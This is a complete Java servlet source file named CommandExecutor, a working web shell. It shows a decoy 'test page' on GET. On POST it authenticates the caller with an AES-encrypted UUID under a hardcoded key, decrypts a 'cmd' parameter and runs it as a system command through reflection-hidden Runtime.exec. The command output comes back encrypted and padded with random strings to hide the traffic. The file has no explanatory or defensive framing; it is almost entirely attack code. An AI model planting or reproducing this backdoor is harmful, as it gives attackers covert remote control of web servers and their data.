package demo;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.MessageDigest;
import java.util.ArrayList;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.UUID;
import javassist.ClassPool;
import javassist.CtClass;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Random;

public class CommandExecutor extends HttpServlet {
    public static String AUTHORIZATION_KEY = "Authorization";
    public static String AUTHORIZATION_PASSWORD = "password123456";
    public static String PARAMETERS_KEY = "cmd";
    public static String uuid = "";
    Class payload;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        PrintWriter writer = resp.getWriter();
        uuid = UUID.randomUUID().toString();
        Object[] parameters = {"X-Seph-Version", uuid};
        getMethodAndInvoke(resp, "setHeader", new Class[]{String.class, String.class}, parameters);
        writer.println("test page");
    }
    
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        ServletRequest var3 = req;
        ServletResponse var4 = resp;
        Object var5 = req;
        Object var6 = resp;
        PrintWriter writer = resp.getWriter();
        try{
            // AES encrypt the uuid using AUTHORIZATION_PASSWORD
            String var8 = aes_encrypt(uuid,AUTHORIZATION_PASSWORD);
            Object var7 = getMethodAndInvoke(var3, "getHeader", new Class[]{String.class}, new Object[]{AUTHORIZATION_KEY});
            // Checks that the field for UUID is not empty and also the AUTHORIZATION header is equals to the aes encrypted value
            if (var7.toString().equals(var8) && !var7.toString().equals("xrQjTh0HCclFET5PKpYH9w==")) {
                String var16 = getMethodAndInvoke(req, "getParameter", new Class[]{String.class}, new Object[]{PARAMETERS_KEY }).toString();
                String parameter = aes_decrypt(var16.toString(), AUTHORIZATION_PASSWORD);
                Class<?> runtimeClass = Class.forName("java.lang.Runtime");
                Method getRuntimeMethod = getMethodByClass(runtimeClass, "getRuntime", new Class[]{});
                Object runtimeObject = getRuntimeMethod.invoke(null);
                Method execMethod = getMethodByClass(runtimeClass, "exec", new Class[]{String.class});
                Process process = (Process) execMethod.invoke(runtimeObject, parameter);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                String encrypted;
                while ((line = reader.readLine()) != null) {
                     encrypted = aes_encrypt(line, AUTHORIZATION_PASSWORD);
                     String random_string = generateRandomString(10);
                     writer.println(random_string + encrypted);
                }
                process.waitFor();
            } else {
            }
        } catch (Exception e) {
             e.printStackTrace(writer);
        }
    }
    
    @Override
    protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        PrintWriter writer = resp.getWriter();
        try {
            String var8 = aes_encrypt(uuid,AUTHORIZATION_PASSWORD);
            Object var7 = getMethodAndInvoke(req, "getHeader", new Class[]{String.class}, new Object[]{AUTHORIZATION_KEY});
            if (var7.toString().equals(var8) && !var7.toString().equals("xrQjTh0HCclFET5PKpYH9w==")) {
                writer.println("passed");
            }
        } catch (Exception e) {
            e.printStackTrace(writer);
        }
    }
    
    public static Object getMethodAndInvoke(Object var0, String var1, Class[] var2, Object[] var3) {
        try{
            Method var4 = getMethodByClass(var0.getClass(), var1, var2);
            if (var4 != null) {
                return var4.invoke(var0, var3);
            }
        } catch (Exception var6) {
        }
        return null;
    }
    
    public static String generateRandomString(int length) {
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        Random random = new Random();
        StringBuilder sb = new StringBuilder(length);

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(characters.length());
            char randomChar = characters.charAt(index);
            sb.append(randomChar);
        }

        return sb.toString();
    }
    
    public static Method getMethodByClass(Class var0, String var1, Class[] var2) {
        Method var3 = null;
        while(var0 != null) {
            try {
                var3 = var0.getDeclaredMethod(var1, var2);
                var3.setAccessible(true);
                var0 = null;
            } catch (Exception var5) {
                var0 = var0.getSuperclass();
            }
        }
        return var3;
    }
    
    public static String base64_encode(byte[] input) throws Exception {
        String output = "";
        try{
            Class base64Class;
            base64Class = Class.forName("java.util.Base64");
            Method getEncoderMethod = base64Class.getMethod("getEncoder");
            Object encoder = getEncoderMethod.invoke(null);
            Method encodeMethod = encoder.getClass().getMethod("encode", byte[].class);
            byte[] base64Bytes = (byte[]) encodeMethod.invoke(encoder, input);
            output = new String(base64Bytes);
        } catch (Exception e) {
            try {
                Class base64Class;
                base64Class = Class.forName("sun.misc.BASE64Encoder");
                Object base64_instance = base64Class.newInstance();
                output = (String) base64_instance.getClass().getMethod("encode", byte[].class).invoke(base64_instance, input);
            } catch (Exception e1) {
            }
        }
        return output;
    }  
      
    public static String aes_encrypt(String input, String key) throws Exception {
        byte[] keyBytes = key.getBytes();
        byte[] paddedKeyBytes = new byte[16];
        System.arraycopy(keyBytes, 0, paddedKeyBytes, 0, Math.min(keyBytes.length, 16));
        SecretKeySpec secretKey = new SecretKeySpec(paddedKeyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encryptedBytes = cipher.doFinal(input.getBytes());
        String base64_encoded_string = base64_encode(encryptedBytes);
        return base64_encoded_string;
    }
    
    public static byte[] decodeBase64(String input) {
        byte[] decoded_bytes = null;
        try{
            Class base64Class;
            base64Class = Class.forName("java.util.Base64");
            Method getDecoderMethod = base64Class.getMethod("getDecoder");
            Object decoder = getDecoderMethod.invoke(null);
            Method decodeMethod = decoder.getClass().getMethod("decode", String.class);
            decoded_bytes = (byte[]) decodeMethod.invoke(decoder, input);
        } catch (Exception e) {
            try{
                Class base64Class;
                base64Class = Class.forName("sun.misc.BASE64Decoder");
                Object base64_instance = base64Class.newInstance();
                decoded_bytes = (byte[])base64_instance.getClass().getMethod("decodeBuffer", String.class).invoke(base64_instance, input);
            } catch (Exception e1) {
                
            }
        }
        return decoded_bytes;
    }
    
    public static String aes_decrypt(String input, String key) throws Exception {
        byte[] encryptedBytes = decodeBase64(input);
        byte[] keyBytes = key.getBytes();
        byte[] paddedKeyBytes = new byte[16];
        System.arraycopy(keyBytes, 0, paddedKeyBytes, 0, Math.min(keyBytes.length, 16));
        SecretKeySpec secretKey = new SecretKeySpec(paddedKeyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
        return new String(decryptedBytes);
    }
    
    public static Object getFieldValue(Object var0, String var1) throws Exception {
        Field var2 = null;
        if (var0 instanceof Field) {
            var2 = (Field)var0;
        } else {
            Class var3 = var0.getClass();

            while(var3 != null) {
                try {
                    var2 = var3.getDeclaredField(var1);
                    var3 = null;
                } catch (Exception var5) {
                    var3 = var3.getSuperclass();
                }
            }
        }

        var2.setAccessible(true);
        return var2.get(var0);
    }
}
